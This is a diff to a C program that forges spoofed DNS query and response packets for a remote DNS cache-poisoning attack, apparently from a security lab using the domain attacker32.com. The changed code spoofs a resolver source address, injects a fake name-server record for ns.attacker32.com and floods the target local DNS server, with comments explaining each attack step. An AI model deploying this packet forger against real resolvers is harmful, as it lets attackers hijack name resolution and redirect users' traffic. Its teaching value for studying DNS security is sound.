@@ -5,7 +5,7 @@
 // Use wireshark to study the packets.
 //
 // Compile command:
-// # gcc -lpcap attack.c -o attack
+// # gcc attack.c -o attack
 // Launch the attack:
 // # sudo ./attack attacker_ip dnsserver_ip
 //
@@ -153,7 +153,9 @@ int main(int argc, char *argv[])
     memset(send_buf, 0, PCKT_LEN);
 
     // Our own headers' structures
+	/* buffer for the response */
     struct ipheader *ip = (struct ipheader *) buffer;
+	/* send_buf for the request */
     struct ipheader *ip2 = (struct ipheader *) send_buf;
     struct udpheader *udp = (struct udpheader *) (buffer + sizeof(struct ipheader));
     struct udpheader *udp2 = (struct udpheader *) (send_buf + sizeof(struct ipheader));
@@ -205,7 +207,7 @@ int main(int argc, char *argv[])
     dns->QDCOUNT=htons(1);
     dns->ANCOUNT=htons(1);
     dns->NSCOUNT=htons(1);
-    dns->ARCOUNT=htons(2);
+    dns->ARCOUNT=htons(0);
 
 //query string
     strcpy(data,"\5aaaaa\3cnn\3com");
@@ -246,36 +248,13 @@ int main(int argc, char *argv[])
     struct datalen * len2=(struct datalen *)(data+length);
     len2->ttl1=htons(1);
     len2->ttl2=htons(1);
-    len2->len=htons(28);
-    length+=6;
+    len2->len=htons(19);
+    length+=6; // ttl1 is 2 bytes, ttl2 is 2 bytes, len is 2 bytes, and thus length is incremented by 6.
     //fake name server
     // ns.attacker32.com. \2ns, here 2 means ns is 2 characters; \3com means com is 3 characters. this is escape sequence: \nnn, in which nnn is oct format, and thus 12 is decimal 10.
     strcpy(data+length,"\2ns\12attacker32\3com");
     length+=19; // 2+10+3=15, 15+4=19, not sure why we need to add 4...
-    //addition 
-    strcpy(data+length,"\2ns\12attacker32\3com");
-    length+=19; // 2+10+3=15, 15+4=19, not sure why we need to add 4...
-    struct dataEnd * end3=(struct dataEnd *)(data+length);
-    end3->type=htons(1);
-    end3->class=htons(1);
-    length+=4;
-    struct datalen * len3=(struct datalen *)(data+length);
-    len3->ttl1=htons(1);
-    len3->ttl2=htons(1);
-    len3->len=htons(4);
-    length+=6;
-	/* octal to decimal: \204\262\343\12 = 132.178.227.10 - which was yellowstone's ip address back then... */
-	/* \254\20\115\202 = 172.16.77.130 */
-    strcpy(data+length,"\254\20\115\202");
-    //Root
-    length+=5;
-    struct dataEnd * end4=(struct dataEnd *)(data+length);
-    end4->type=htons(41);
-    end4->class=htons(4096);
-    length+=6;
-    struct dataEnd * end5=(struct dataEnd *)(data+length);
-    end5->type=htons(34816);
-    end5->class=htons(0);
+    /* additional section: we don't really need to inject the additional section, since we host the DNS service for attacker32.com already, and we know victim server will ask us for anything about this domain. */
 
 /////////////////////////////////////////////////////////////////////
 //
@@ -326,7 +305,9 @@ now focus on how to do the settings and send the packet we have composed out
     ip->iph_ttl = 110; // hops
     ip->iph_protocol = 17; // UDP
     // Source IP address, can use spoofed address here!!!
-    ip->iph_sourceip = inet_addr("198.41.0.4");
+	/* we assume the victim server will ask 1.2.3.4, and we now just pretend to be 1.2.3.4... */
+    ip->iph_sourceip = inet_addr("1.2.3.4");
+    // ip->iph_sourceip = inet_addr("198.41.0.4");
 
     // The destination IP address - this should be the local DNS server's IP address, we are trying to poison this one.
     ip->iph_destip = inet_addr(argv[2]);
@@ -408,7 +389,8 @@ ipheader_size + udpheader_size
         if(sendto(sd, send_buf, packetLength_send, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
         printf("packet send error %d which means %s\n",errno,strerror(errno));
 //	printf("delay...\n");
-	delay(3000);
+/* delay so that the local DNS server has the time to send out the requests... */
+	delay(100);
 //	printf("delay done, now send fake responses.\n");
         //send fake response
         unsigned short int co=65535;
